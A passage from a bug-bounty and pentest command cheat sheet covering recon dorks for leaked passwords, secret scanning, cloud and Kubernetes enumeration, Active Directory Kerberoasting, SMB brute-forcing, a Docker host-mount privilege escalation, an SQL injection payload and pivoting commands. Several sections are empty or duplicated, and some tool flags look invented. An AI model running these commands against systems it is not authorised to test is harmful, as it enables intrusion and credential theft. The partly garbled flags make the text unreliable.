    :- (Manual via browser, conceptual via tools if available or scripting)
    :- Example Google Dork for confidential PDFs
    site:target.com filetype:pdf confidential
    
    :- Dork for directory listings with "backup"
    site:target.com intitle:"index of" "backup"
    
    :- Dork for SQL files with credentials
    site:target.com ext:sql "username" "password"
    
    :- Search GitHub for API keys related to target
    site:github.com "target.com" "api_key"
    
    :- Search Trello boards
    site:trello.com "target.com" "password"


### 7.3 Metadata Analysis
    :- Extract EXIF data from an image
    exiftool image.jpg -o exif_metadata.txt
    
    :- Extract common metadata from PDFs in a folder
    exiftool -r -ext pdf -common documents_folder/ -csv > metadata_report.csv 

### 7.4 Code Repository Searching
    :- (Manual on GitHub/GitLab with advanced search)
    
    :- GitHub search for 'password' in JS related to target.com
    "target.com" language:javascript password
    
    :- Search within a specific GitHub organization
    org:"TargetOrg" "SECRET_KEY"

    
    :- Scan GitHub org for sensitive files
    gitrob --github-access-token YOUR_GITHUB_TOKEN target_organization
    
    :- Scan local git repo for secrets
    gitleaks detect --source . -v -r gitleaks_report.json
    
    :- Find secrets in GitHub org
    trufflehog github --org <target_org> --json > trufflehog_github.json 
    
    :- Find secrets in local filesystem
    trufflehog filesystem /path/to/code --json > trufflehog_local.json

## 8. CLOUD SECURITY


### 8.1 AWS Security Auditing
    :- AWS CIS Benchmarks Level 1, JSON output, silent
    prowler -g cislevel1 -M json -S -f us-east-1 -o prowler_cis_report.json 
    
    :- Check specific Prowler check (e.g., S3 public access)
    prowler -c s3_bucket_public_access -M csv -o prowler_s3_public.csv
    
    :- List checks for HIPAA group in JSON
    prowler aws -g hipaa --list-checks-json
    
    :- AWS security auditing using a specific profile
    scoutsuite aws --profile myawscli_profile --report-dir scout_aws_report/ 
    
    :- Using temporary credentials
    scoutsuite aws --access-key-id AKIA... --secret-access-key ... --session-token ... 
    
    :- Import AWS keys into Pacu
    pacu --import-keys --key-alias mycorp

    :- Example Pacu command for IAM enumeration

    :- Inside Pacu: run iam_enum_permissions
    :- Example Pacu command for S3
    :- Inside Pacu: run s3_download_bucket --bucket-name mybucket --all

### 8.2 Azure Security Auditing
    :- List Azure PIM role assignments
    az PIM role assignment list --assignee user@domain.com --all -o table 
    
    :- Azure Resource Graph query for storage accountsaz graph query -q "Resources | where type =~ 'microsoft.storage/storageaccounts' | project name, properties.primaryEndpoints.
    blob" -o json 

    :- (ScoutSuite supports Azure: scoutsuite azure --subscription-id "YOUR_SUB_ID")
    :- GCP Security Auditing
    :- (ScoutSuite supports GCP: scoutsuite gcp --project-id "your-project-id")    
    :- Get GCP project IAM policy
    gcloud projects get-iam-policy YOUR_PROJECT_ID --format=json > gcp_iam_policy.json 
    
    :- Search IAM policies for a service accountgcloud asset search-all-iam-policies --scope=projects/YOUR_PROJECT_ID --query="policy:serviceAccount:your-sa@project.iam.
    gserviceaccount.com" 

### 8.3 Finding Exposed K8s API Servers



## 9. CONTAINER & ORCHESTRATION SECURITY


### 9.1 Docker Enumeration & Exploitation
    :- Check Docker version (potential vulns)
    docker version
    
    :- List all containers (running and stopped)
    docker ps -a
    
    :- List downloaded images
    docker images
    
    :- List Docker networks
    docker network ls
    
    :- List Docker volumes
    docker volume ls
    
    :- Get detailed info about a container
    docker inspect <container_id_or_name>
    
    :- Execute a shell inside a running container
    docker exec -it <container_id_or_name> /bin/sh
    
    :- Mount host filesystem into a new container (privilege escalation if socket is exposed)
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

### 9.2 Kubernetes Enumeration
    :- Check client and server version
    kubectl version
    
    :- Get cluster endpoint and services info
    kubectl cluster-info
    
    :- List nodes in the cluster with IPs
    kubectl get nodes -o wide
    
    :- List all namespaces
    kubectl get namespaces
    
    :- List pods in a namespace with node info
    kubectl get pods -n <namespace> -o wide
    
    :- List services in a namespace
    kubectl get services -n <namespace>
    
    :- List secrets (check permissions!)
    kubectl get secrets -n <namespace>
    
    :- List RBAC roles and bindings
    kubectl get roles,rolebindings -n <namespace>
    
    :- List configmaps (may contain config/sensitive data)
    kubectl get configmaps -n <namespace>
    
    :- Check current user's permissions in a namespace
    kubectl auth can-i --list --namespace=<namespace>
    
    :- Get detailed info about a pod (env vars, volumes)
    kubectl describe pod <pod_name> -n <namespace>
    
    :- View logs for a pod
    kubectl logs <pod_name> -n <namespace>

    :- Finding Exposed K8s API Servers (via Shodan/Censys etc.)    
    Search for: "product:kubernetes" "port:443" "ssl:kube-apiserver"
    Search for: "port:10250" "kubelet" (Kubelet read-only port)

### 9.3 Kubernetes Attack Tools
    :- Tool for auditing K8s clusters (various checks)
    cd_k8s_audit
    
    :- Scan K8s cluster for security issues (from outside)
    kube-hunter --remote <node_ip_or_dns>
    
    :- Run kube-hunter from within a pod
    kube-hunter --pod
    kubesploit (Metasploit-like framework for K8s)

## 10. WINDOWS/ACTIVE DIRECTORY RECON
    :- (Often used after gaining initial foothold, relevant if bug bounty scope includes internal testing or pivoting)

    :- User & Group Enumeration    
    :- List local users
    net user
    
    :- List domain users (if joined)
    net user /domain
    
    :- List domain groups
    net group /domain
    
    :- List members of Domain Admins group
    net group "Domain Admins" /domain
    
    :- Get users and SIDs
    wmic useraccount get name,sid


### 10.1 User & Group Enumeration


### 10.2 Network & Domain Info
    :- Get network configuration, DNS servers, domain name
    ipconfig /all
    
    :- Find domain controllers
    nltest /dsgetdc:<domain_name>
    
    :- List machines in the domain
    net view /domain:<domain_name>
    
    :- Check connectivity
    ping <DomainControllerName>

    Service Principal Name (SPN) Scanning (Kerberoasting)
    
    :- Request service tickets user can delegate (Kerberoasting)
    GetUserSPNs.py (Impacket) domain.local/user -request
    
    :- Use Rubeus to perform Kerberoasting
    Rubeus.exe kerberoast /outfile:hashes.kerberoast

### 10.3 SMB Enumeration
    :- Basic SMB enumeration on a subnet
    crackmapexec smb 192.168.1.0/24
    
    :- Check credentials and list shares
    crackmapexec smb targets.txt -u username -p password --shares
    
    :- Enumerate logged-in users
    crackmapexec smb targets.txt --lusers
    
    :- Brute force RIDs to find users
    crackmapexec smb targets.txt -M rid_brute

### 10.4 BloodHound Data Collection
    :- Collect AD data using SharpHound collector
    SharpHound.exe -c All -d yourdomain.local --zipfilename data.zip 
    (Upload data.zip to BloodHound GUI for analysis)

## 11. REPORTING & AUTOMATION
    ::- AUTOMATION SNIPPETS & WORKFLOW EXAMPLES

    :- Bash loop to run nuclei on subdomains found by subfinder    
    subfinder -d target.com -silent | nuclei -t ~/nuclei-templates/exposures/ -c 50 -o nuclei_exposure_results.txt

    :- Bash loop for directory brute-forcing multiple hosts    
    while read host; do ffuf -w wordlist.txt -u "$host/FUZZ" -mc 200 -o "ffuf_$(basename $host).txt"; done < live_hosts.txt

    :- Find JS files, then extract secrets    
    subfinder -d target.com -silent | httpx -silent | subjs -c 10 | while read url; do secretfinder -i "$url" -o "secrets_$(basename $url).json"; done

    :- Combine passive and active enum, resolve, check live hosts, and screenshot    
    { subfinder -d target.com -silent; amass enum -passive -d target.com -silent; } | sort -u > subs.txt
    puredns resolve subs.txt -r resolvers.txt | httpx -silent -status-code -o live.txt
    gowitness file -f live.txt -P screenshots/ --threads 10

    :- Filter URLs for potential XSS using gf and test with dalfox    
    cat all_urls.txt | gf xss | dalfox pipe -b your.collab.server -o dalfox_xss_results.txt



### 11.1 Report Generation
    :- JSON output for integration
    nuclei -l urls.txt -t critical_vulns.yaml -json -o critical_report.json 
    
    :- Nikto HTML report
    nikto -h target.com -Format htm -output nikto_web_report.html
    
    :- SQLMap stores results in output dir
    sqlmap -r request.txt --batch --output-dir sqlmap_results/
    ------
    nuclei -l urls.txt -t nuclei-templates/ -me reports/ -s critical,high
    dalfox report -o report.html
    dalfox report -o report.html --format html --input scan.json
    arachni --report-save-path=report.afr --checks=active/* https://target.com
    ------
    nuclei -l urls.txt -t nuclei-templates/ -me reports/ -s critical,high -json -o nuclei_report.json
    dalfox report -o report.md --format markdown --input scan.json
    arachni --report-save-path=report_full.afr --checks=* https://target.com
    ------
    nuclei -l urls.txt -t nuclei-templates/ -me reports/ -s critical,high -json -o nuclei_report_full.json -template-display-mode id
    dalfox report -o report_detailed.html --format html --input scan.json --severity-min critical --export-type markdown
    arachni --report-save-path=report_very_full.afr --checks=* --scope-exclude-pattern "logout|signout" https://target.com


### 11.2 Workflow Automation
    :- (Conceptual - many custom scripts exist)    
    ./my_recon_script.sh target.com
    ./full_scan_automation.sh target.com -o /reports/target_com_$(date +%F)

    bugbounty-auto -c config.yaml -t target.com -o output/
    reconftw -d target.com -a -r -w -o reconftw_output
    autorecon --only-scans --output scans/ target.com
    interlace -tL targets.txt -c "nuclei -u _target_"
    ------
    bugbounty-auto -c config_advanced.yaml -t target.com -o output_full/
    reconftw -d target.com -a -r -w -o reconftw_all -threads 50 -v
    autorecon --full --output autorecon_full/ target.com
    ------
    bugbounty-auto -c config_very_advanced.yaml -t target.com -o output_very_full/
    reconftw -d target.com -a -r -w -o reconftw_ultimate -threads 75 -v -all-scripts
    autorecon --full --scripts all --output autorecon_ultimate/ target.com

#### 11.2.1 Bash loop to run nuclei on subdomains


#### 11.2.2 Bash loop for directory brute-forcing


#### 11.2.3 Combine passive/active enum, resolve, check hosts


#### 11.2.4 Filter URLs for potential XSS


### 11.3 Markdown Notes
    echo "#### Vulnerability: SQL Injection" >> report.md    
    echo "**URL:** https://vuln.target.com/product?id=1" >> report.md
    echo "**Parameter:** id" >> report.md
    echo "**Payload:** \`1' OR '1'='1 -- \`" >> report.md
    echo "**Evidence:**" >> report.md
    echo '```sqlmap output...' >> report.md
    sqlmap -u "[https://vuln.target.com/product?id=1](https://vuln.target.com/product?id=1)" --batch --banner >> report.md
    echo '```' >> report.md

## 12. UTILITIES & MISCELLANEOUS


### 12.1 Wordlist Management
    cewl https://target.com -d 3 -m 5 -w custom_words.txt
    kwprocessor -b 1 -e 2 -l 3 --stdout > keyboard_walk.txt
    domain-analyzer -d target.com -o keywords.txt
    seclists -h
    custom-list -d target.com -o custom_wordlist.txt
    ------
    cewl https://target.com -d 5 -m 10 -w custom_words_deep.txt --email --meta --no-words
    kwprocessor -b 2 -e 3 -l 4 --stdout --numbers --symbols > keyboard_walk_complex.txt
    domain-analyzer -d target.com -o keywords_full.txt -t 5
    puredns resolve -l subdomains.txt -r /etc/resolv.conf -w resolved.txt
    puredns bruteforce subdomains.txt target.com -w /subdomains-top1million-5000.txt -o brute_resolved.txt
    ------
    cewl https://target.com -d 6 -m 15 -w custom_words_extreme.txt --email --meta --no-words --lowercase --strip-words "the,and,for"
    kwprocessor -b 3 -e 4 -l 5 --stdout --numbers --symbols --leet > keyboard_walk_ultimate.txt
    domain-analyzer -d target.com -o keywords_ultimate.txt -t 7 -s 100
    puredns resolve -l subdomains.txt -r /etc/resolv.conf -w resolved_full.txt -threads 50
    puredns bruteforce subdomains.txt target.com -w /subdomains-top1million-5000.txt -o brute_resolved_full.txt -threads 50 -rate 1000
    gobuster vhost -u FUZZ.target.com -w subdomains.txt -t 100 -o vhost_brute.txt
    gobuster s3 -u target-bucket.s3.amazonaws.com -w aws_s3_bucket_names.txt -t 50 -o s3_brute.txt

#### 12.1.1 Wordlist Generation
    :- Custom wordlist from site, depth 3, min length 6
    cewl https://target.com -d 3 -m 6 -w custom_words_from_site.txt
    
    :- Include numbers found on site
    cewl https://target.com -d 2 --with-numbers -o cewl_with_numbers.txt
    
    :- Keyword processor (example, may need specific tool)
    kwp -s /usr/share/wordlists/dirb/common.txt -b 3 -e 3 > mutations.txt

### 12.2 Data Processing
    gf xss urls.txt | tee xss_urls.txt
    anew old.txt new.txt > combined.txt
    urldedupe -s urls.txt > unique_urls.txt
    ------
    gf xss urls.txt | grep -v "logout\|redirect" | tee xss_filtered.txt
    anew old.txt new1.txt new2.txt > combined_all.txt
    urldedupe -s urls_large.txt -o unique_large.txt -threads 20
    sed -i 's/http:/https:/g' urls_http.txt # Replace http with https
    awk '/param=/ {print $0}' urls_with_params.txt > params_only.txt
    ------
    gf xss urls.txt | grep -Po '([\'"]).*?\1' | tee xss_quotes.txt
    anew old1.txt old2.txt new1.txt new2.txt > combined_mega.txt
    urldedupe -s massive_urls.txt -o unique_massive.txt -threads 100 -buffer-size 100000
    sed -i 's/https:\/\/www\./https:\/\//g' urls_no_www.txt
    awk -F'=' '{print $2}' urls_with_equals.txt > values_only.txt
    cut -d '/' -f 3 urls_hostname_only.txt | sort -u | tee hostnames.txt

#### 12.2.1 Data Processing & Manipulation
    :- Combine and unique subdomain lists
    cat *.txt | sort -u > all_unique_subdomains.txt
    
    :- Append new unique lines
    anew old_urls.txt new_discovered_urls.txt > combined_urls.txt
    
    :- Deduplicate URLs (another tool example)
    urldedupe -s urls_with_duplicates.txt > unique_urls.txt
    
    :- Filter URLs with gf patterns for XSS
    gf xss urls_to_check.txt | tee xss_potential_urls.txt
    
    :- Filter for SQLi patterns
    gf sqli urls_to_check.txt | tee sqli_potential_urls.txt
    
    :- Extract unique parameter names from URLs
    cat urls.txt | unfurl --unique keys > unique_params.txt
    
    :- Extract scheme and path
    cat urls.txt | unfurl format %s%p > scheme_path.txt
    
    :- Probe live hosts and get info
    cat subdomains.txt | httpx -silent -status-code -title -o live_hosts_info.txt 

#### 12.2.2 JSON Processing with jq
    :- Pretty print JSON
    cat data.json | jq .
    
    :- Extract all user names
    cat data.json | jq '.users[].name'
    
    :- Filter objects with status active
    cat data.json | jq 'select(.status=="active")'
    
    :- Wrap multiple JSON objects into an array
    cat file_with_json_lines.txt | jq -s

#### 12.2.3 Encoding/Decoding
    :- Base64 encode
    echo -n "string" | base64
    
    :- Base64 decode
    echo "c3RyaW5n" | base64 -d
    
    :- For Basic Auth header generation
    echo -n "admin:password" | base64 
    
    :- URL encode
    python3 -c "import urllib.parse; print(urllib.parse.quote_plus('test value?&='))" 
    
    :- URL decode
    python3 -c "import urllib.parse; print(urllib.parse.unquote_plus('test+value%3F%26%3D'))" 
    
    :- Hex encode HTML for some bypasses
    echo "<h1>test</h1>" | xxd -p | tr -d '\n'

### 12.3 Network Utilities
    :- Scan through proxychains (replace nmap command as needed)
    proxychains4 -q nmap -sT -Pn -n target.com
    
    :- Intercept and log traffic, allow all
    mitmproxy -w traffic_log.mitm --set "block_global=false"
    
    :- Run mitmproxy with a custom Python script on port 8081
    mitmproxy -s "script.py --param value" -p 8081
    
    :- Port forwarding / pivoting
    socat TCP-LISTEN:4443,fork TCP:your_listener_ip:4444

    proxychains -q nmap -sT -Pn -n target.com
    mitmproxy -w traffic.mitm -s script.py
    curl -I https://target.com
    ------
    proxychains4 -q nmap -sT -Pn -n target.com -p 1080
    mitmproxy -w traffic_full.mitm -s advanced_script.py
    socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
    ssh -D 1080 user@proxy.server # SOCKS proxy
    ------
    proxychains4 -q nmap -sT -Pn -n target.com -p 1080 -i -c proxychains.conf
    mitmproxy -w traffic_ultimate.mitm -s advanced_script.py --ssl-insecure --anticache
    socat TCP-LISTEN:4433,fork OPENSSL:127.0.0.1:443,cert=server.pem,key=server.key
    tcpdump -i eth0 -nn -vv -X port 80 or port 443 -w traffic.pcap
    tshark -r traffic.pcap -T fields -e http.request.method -e http.request.uri | sort -u

### 12.4 Password Cracking
    hashcat -m 0 hashes.txt rockyou.txt
    john --wordlist=rockyou.txt hashes.txt

### 12.5 File Upload Testing
    upload-fuzz -u https://target.com/upload -f payloads/

    :- Cloud-Specific Tools (Security Hardening Checks)
    scoutsuite --provider aws --regions all --output-dir scout_all_regions_detailed --checks all
    prowler -g cislevel1,pci,hipaa -r all -M json -o prowler_compliance.json
    aws-nuke --config aws-nuke.yaml --profile default --dry-run
    gcloud compute firewall-rules list --project target-project
    az network security-group list --resource-group target-rg --output table


### 12.6 One-liners for Recon Chains
### One-liners for Recon Chains    
    :- Find live subdomains
    assetfinder --subs-only target.com | httpx -silent -threads 100 | anew live_subdomains.txt 
    
    :- Fuzz live subdomains
    cat live_subdomains.txt | nuclei -t /path/to/fuzzing-templates/ -c 50 -o fuzzing_results.txt 
    
    :- Get tech, title, status for subs
    subfinder -d target.com -silent | httpx -silent -tech-detect -title -status-code -o tech_and_status.txt 

### 12.7 Masscan + Nmap
    :- Fast port scan large range
    masscan -p80,443,8000-8100 10.0.0.0/8 --rate 100000 -oL masscan_results.txt 
    
    :- Extract IPs from masscan
    awk -F'[ /]' '/open/{print $4}' masscan_results.txt | sort -u > open_ips.txt 
    
    :- Detailed Nmap scan on IPs/ports from masscan (needs port extraction logic)
    nmap -sV -sC -iL open_ips.txt -pT:$(paste -sd, open_ports_for_nmap.txt) -oN nmap_detailed_scan.txt 


### 12.8 Interacting with Services
    :- GET request with Auth header, pipe to jq
    curl -s -X GET "http://target.com/api/users" -H "Authorization: Bearer TOKEN" | jq . 
    
    :- Netcat listen for incoming connections
    ncat -lvnp 4444
    
    :- Send raw HTTP request from file
    ncat target.com 80 < http_request.txt

### 12.9 Shell Tricks

### 12.10 Miscellaneous helpful commands    
    :- Run nmap for each IP in a list
    xargs -a list_of_ips.txt -I {} nmap -sV -p80,443 {}
    
    :- Find API keys in local JS files
    find . -name "*.js" -exec grep -Hn "api_key" {} \;
    
    :- Resolve all domains in a file
    for domain in $(cat domains.txt); do host $domain; done | grep "has address" 

# Fuzzing Tools (General Purpose)
    wfuzz -c -z file,/SQLi/Generic-SQLi.txt --hc 200 https://target.com/index.php?id=FUZZ
    radamsa -n 1000 -o mutated.txt < input.txt
    afl-fuzz -i in -o out -t 10000 -m 100 -x Fuzzing/fuzzing-patterns.txt -- ./vulnerable_program @@

### Other
    :- Screenshot tools often save files automatically (gowitness, httpx -ss)
    
    :- Timestamping output files 
    nuclei ... -o "nuclei_scan_$(date +%Y%m%d_%H%M%S).txt"
    
    :- This cheat sheet covers a wide array of tools and techniques.
    :- Effective bug hunting involves choosing the right tool for the job, understanding its output, and creatively combining techniques. Always operate ethically and within the defined scope.